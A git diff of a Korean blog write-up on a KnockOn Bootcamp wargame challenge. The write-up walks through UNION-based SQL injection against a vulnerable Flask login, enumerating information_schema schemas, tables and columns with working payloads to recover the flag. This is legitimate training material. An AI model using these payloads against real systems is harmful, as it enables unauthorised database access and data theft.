@@ -1,53 +1,34 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 1.2 SQL Injection - DB"
+title: "KnockOn Bootcamp 2nd - 1.2 SQL Injection - Database"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
+  - KnockOn Bootcamp 2nd
   - SQL Injection
-  - DB
-last_modified_at: 2024-08-24T04:31:00-05:00
+  - Database Enumeration
+last_modified_at: 2024-08-24T18:31:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10002/>
 
-![1.2 SQL Injection - DB 1](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_1.png)
+![1.2 SQL Injection - DB 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-2-sql-injection-1.png)
 
-![1.2 SQL Injection - DB 2](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_2.png)
+![1.2 SQL Injection - DB 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-2-sql-injection-8.png)
 
-![1.2 SQL Injection - DB 3](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_3.png)
-
-|
+![1.2 SQL Injection - DB 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-2-sql-injection-7.png)
 
 ### 목표
 
----
-
 서버의 데이터베이스에 접근하여 정보 탈취하기
 
-|
-
-|
-
 ### 공격 기법
-
----
 
 SQL Injection
 
 - Union select
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -72,17 +53,14 @@ app.config["SQLALCHEMY_DATABASE_URI"] = (
 app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
 db = SQLAlchemy(app)
 
-
 class User(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(80), unique=True, nullable=False)
     password = db.Column(db.String(80), nullable=False)
 
-
 @app.route("/")
 def home():
     return render_template("index.html")
-
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
@@ -105,13 +83,11 @@ def login():
             error = "Invalid Credentials"
     return render_template("login.html", error=error, query=query)
 
-
 @app.route("/success")
 def success():
     username = request.args.get("username", "Unknown")
     flag = request.args.get("flag", "So.. what?")
     return render_template("success.html", username=username, flag=flag)
-
 
 if __name__ == "__main__":
     db.create_all()
@@ -119,17 +95,9 @@ if __name__ == "__main__":
 
 ```
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ### user 테이블
-
----
 
 | id | username | password |
 |:---|:---------|:---------|
@@ -138,13 +106,7 @@ if __name__ == "__main__":
 
 [<1.1 SQL Injection Login>](https://parkseunghan.github.io/web%20hacking/knock-on-challenges-1-1/)에서 구한 user 테이블
 
-|
-
-|
-
 ### login()
-
----
 
 ```python
 query = text(
@@ -159,11 +121,9 @@ query = text(
 
 **이 부분을 이용해야됨**
 
-위 쿼리로 정상적으로 실행된다면, `user` 변수는 user 테이블의 행을 나타내겠지만
+위 쿼리로 정상적으로 실행됨면, `user` 변수는 user 테이블의 행을 나타내겠지만
 
 user 테이블이 아닌 **DB에 대한 정보**를 얻어야 하기 때문에 쿼리를 조작하여 `user` 변수 자리에 다른 쿼리 결과를 넣어야 함
-
-|
 
 ```python
 if user and user[1] == "admin":
@@ -176,23 +136,15 @@ elif user:
 
 조작된 쿼리 실행 결과를 `user` 변수에 저장하면, `user[1]` 자리에 내가 원하는 쿼리 결과를 화면에 띄울 수 있음
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```sql
 SELECT * FROM user WHERE username = '{username}' AND password = '{password}'
 ```
- 
+
 DB 데이터를 얻기 위해서는 새로운 쿼리가 필요함
 
 이를 위해 **union**을 사용
- 
-|
 
 ```sql
 select * from user where username = 'admin' -- 첫 번째 쿼리
@@ -204,8 +156,6 @@ select 1 -- 두 번째 쿼리
 예를 들어,
 
 첫 번째 쿼리의 열 개수가 한 개라면 정상 동작하지만, 그 이외의 경우 정상 동작하지 않음
-
-|
 
 ```sql
 select * from user where username = 'admin' -- 첫 번째 쿼리
@@ -219,21 +169,15 @@ select 1, 2, 3, ... -- 두 번째 쿼리
 
 쿼리가 정상적으로 실행될 때까지 두 번째 쿼리의 열 개수를 늘려가며 첫 번째 쿼리의 열 개수를 알아낼 수 있음
 
-|
-
-| 
-
 ```sql
 ' union select 1,2,3 -- 1
 ```
 
-![1.2 SQL Injection - DB 4](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_2.png)
+![1.2 SQL Injection - DB 4](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-2-sql-injection-8.png)
 
-첫 번째 열 개수가 세 개라는 것과 
+첫 번째 열 개수가 세 개라는 것과
 
 두 번째 쿼리의 두 번째 열의 데이터인 '2'가 화면에 출력된다는 것을 알아냄
-
-|
 
 ```sql
 SELECT * FROM user WHERE username = ''
@@ -255,8 +199,6 @@ user[1] = 2
 
 user[2] = 3
 
-|
-
 ```sql
 ' union select 1,(새 쿼리),3 -- 1
 ```
@@ -265,17 +207,9 @@ user[2] = 3
 
 그 결과가 화면에 출력될 것임
 
-|
-
-|
-
 ### information_schema
 
----
-
 데이터베이스를 확인하기 위해 필요한 건 **`information_schema`**라는 DB임
-
-|
 
 ```sql
 select 1 from 데이터베이스.테이블명
@@ -285,8 +219,6 @@ select 1 from 데이터베이스.테이블명
 
 위와 같은 방법으로 테이블이 존재하는지 확인할 수 있음
 
-|
-
 ```sql
 '
 union
@@ -295,11 +227,7 @@ select 1 from information_schema.테이블명 limit 0,1
 
 여기선 열의 개수가 1이 되어야 하기 때문에 결과를 하나로 제한하기 위해 **limit**을 사용
 
-|
-
 하지만 `information_schema`의 테이블명을 모르기 때문에 MySQL을 실행하여 알아보겠음
-
-|
 
 ```sh
 mysql> show databases;
@@ -315,8 +243,6 @@ mysql> show databases;
 ```
 
 DB 목록을 확인해보면 `information_schema`, `mysql`, `performance_schema`, `sys` 네 가지 테이블이 기본적으로 존재하는 걸 알 수 있음
-
-|
 
 ```sh
 mysql> use information_scheme;
@@ -413,8 +339,6 @@ mysql> show tables;
 
 앞에 **'*'**표시가 있는 테이블들은 존재함
 
-|
-
 이 중 데이터베이스 정보를 추출하기 위해서는 다음 세 가지의 테이블이 필요함
 
 `information_schema.SCHEMATA`: 데이터베이스
@@ -423,13 +347,7 @@ mysql> show tables;
 
 `information_schema.COLUMNS`: 열
 
-|
-
-|
-
 ### 1. SCHEMATA: 데이터베이스 조회
-
----
 
 ```sh
 mysql> select * from information_schema.SCHEMATA;
@@ -449,23 +367,15 @@ mysql> select * from information_schema.SCHEMATA;
 
 `SCHEMA_NAME`이 데이터베이스의 이름
 
-|
-
----
-
-|
-
 ```sql
 select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1
 ```
 
 `information_schema.SCHEMATA` 테이블의 첫 번째 `SCHEMA_NAME`
 
-![1.2 SQL Injection - DB 5](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_3.png)
+![1.2 SQL Injection - DB 5](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-2-sql-injection-7.png)
 
 기본 데이터베이스이므로 패스
-
-|
 
 ```sql
 select SCHEMA_NAME from information_schema.SCHEMATA limit 1,1
@@ -473,11 +383,9 @@ select SCHEMA_NAME from information_schema.SCHEMATA limit 1,1
 
 두 번째 `SCHEMA_NAME`
 
-![1.2 SQL Injection - DB 6](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_4.png)
+![1.2 SQL Injection - DB 6](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-2-sql-injection-8.png)
 
 처음 보는 데이터베이스 이름임. 아마 이게 찾고자 하는 DB일 것임
-
-|
 
 ```sql
 select SCHEMA_NAME from information_schema.SCHEMATA limit 2,1
@@ -485,15 +393,11 @@ select SCHEMA_NAME from information_schema.SCHEMATA limit 2,1
 
 세 번째 `SCHEMA_NAME`도 확인해보면
 
-![1.2 SQL Injection - DB 7](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_5.png)
+![1.2 SQL Injection - DB 7](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-2-sql-injection-7.png)
 
-없음.
+없음
 
 찾고자 하는 DB는 `sqli_lab`임이 확실함
-
-|
-
-|
 
 ### 2. TABLES: 테이블 조회
 
@@ -512,12 +416,6 @@ mysql> select * from information_schema.TABLES limit 2;
 
 데이터베이스 컬럼은 `TABLE_SCHEMA`이고, 테이블 컬럼은 `TABLE_NAME`
 
-|
-
----
-
-|
-
 ```sql
 select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = "sqli_lab" limit 0,1
 ```
@@ -526,11 +424,9 @@ select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = "sqli_lab"
 
 첫 번째 `TABLE_NAME`
 
-![1.2 SQL Injection - DB 8](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_6.png)
+![1.2 SQL Injection - DB 8](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-2-sql-injection-8.png)
 
 flag같은 뭔가 나옴
-
-|
 
 ```sql
 select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = "sqli_lab" limit 1,1
@@ -538,11 +434,9 @@ select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = "sqli_lab"
 
 두 번째 `TABLE_NAME`
 
-![1.2 SQL Injection - DB 9](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_7.png)
+![1.2 SQL Injection - DB 9](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-2-sql-injection-7.png)
 
 user 테이블 등장
-
-|
 
 ```sql
 select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = "sqli_lab" limit 2,1
@@ -550,15 +444,11 @@ select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = "sqli_lab"
 
 세 번째 `TABLE_NAME`
 
-![1.2 SQL Injection - DB 10](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_8.png)
+![1.2 SQL Injection - DB 10](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-2-sql-injection-8.png)
 
 없음
 
 첫 번째 테이블인 `K0{`의 열을 들여다봐야 함
-
-|
-
-|
 
 ### 3. COLUMNS: 열 조회
 
@@ -577,12 +467,6 @@ mysql> select * from information_schema.columns limit 2;
 
 데이터베이스는 `TABLE_SCHEMA`, 테이블 명은 `TABLE_NAME`, 컬럼 명은 `COLUMN_NAME`
 
-|
-
----
-
-|
-
 ```sql
 select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = "K0{" limit 0,1
 
@@ -593,16 +477,11 @@ select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA = "sqli_la
 
 첫 번째 `COLUMN_NAME`
 
-![1.2 SQL Injection - DB 11](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_9.png)
+![1.2 SQL Injection - DB 11](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-2-sql-injection-9.png)
 
 flag 조각이 나옴
 
-|
-
 두 번째 `COLUMN_NAME`부터는 user 테이블에 대한 열이므로 순서대로 id, username, password가 나왔음
-
-|
-
 
 | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME |
 |: ------------|:-----------|:------------|
@@ -611,16 +490,9 @@ flag 조각이 나옴
 | sqli_lab     | user       | username    |
 | sqli_lab     | user       | password    |
 
-
 정리하면 이런 테이블이 완성됨
 
-|
-
-|
-
 ### 4. 열의 데이터 조회
-
----
 
 앞에서 얻은 결과 종합
 
@@ -628,11 +500,7 @@ flag 조각이 나옴
 |:---|:---|:---|
 | sqli_lab | k0{ | Und3r_c0 |
 
-|
-
 이제 마지막으로 `Und3r_c0`열에 대한 데이터를 조회하면 됨
-
-|
 
 ```sql
 select Und3r_c0 from sqli_lab.K0{ limit 0,1
@@ -643,8 +511,6 @@ select Und3r_c0 from sqli_lab.K0{ limit 0,1
 테이블을 참조할 땐 특수문자를 사용할 수 없음
 
 특수문자 `'{'`를 사용하기 위해서는 백틱(`)을 사용해야함
-
-|
 
 ```sql
 select Und3r_c0 from sqli_lab.`K0{` limit 0,1
@@ -657,27 +523,17 @@ sqli_lab.`K0{`
 `sqli_lab.K0{` 는 사용 불가
 ```
 
-![1.2 SQL Injection - DB 12](/assets/images/writeup/web-hacking/knock-on/1-2_SQL_Injection_10.png)
+![1.2 SQL Injection - DB 12](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-1-2-sql-injection-10.png)
 
 마지막 플래그 조각을 얻었다
 
-|
-
 ### 최종 정리
-
----
 
 | Database | Table | Column | Column Value |
 |:---|:---|:---|:---|
 | sqli_lab | k0{ | Und3r_c0 | nstrUct10n} |
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ```
 username: ' union select 1,(query),3 -- 1
@@ -685,11 +541,7 @@ username: ' union select 1,(query),3 -- 1
 password: 1
 ```
 
-|
-
 ### query
-
----
 
 ```sql
 select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = "sqli_lab" limit 0,1
@@ -707,18 +559,8 @@ select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA = "sqli_la
 select Und3r_c0 from sqli_lab.`K0{` limit 0,1
 ```
 
-|
-
-|
-
-### FLAG 
-
----
+### FLAG
 
 ```
 K0{Und3r_c0nstrUct10n}
 ```
-
-|
-
----
